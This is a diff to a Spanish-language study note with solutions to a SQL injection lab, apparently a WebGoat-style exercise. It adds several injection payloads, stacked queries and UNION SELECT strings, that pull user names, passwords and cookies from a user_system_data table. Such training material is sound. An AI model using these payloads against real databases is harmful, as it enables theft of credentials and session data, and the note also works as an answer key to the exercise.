@@ -53,9 +53,19 @@ SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_t
 
 #### Obten toda la información de las tablas
 
-
+Solución
 ```sql
-'SELECT * FROM user_data WHERE last_name = ''; SELECT * FROM user_system_data ;--'
+'SELECT * FROM user_system_data ;--
+```
+
+Otra solución:
+```sql
+' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--
+```
+
+Otra solución:
+```sql
+' SELECT first_name, last_name, cookie FROM user_data UNION ALL SELECT user_name, password, cookie FROM user_system_data;--
 ```
 
 #### Cuando lo obtengas responde cuál es el password de Dave
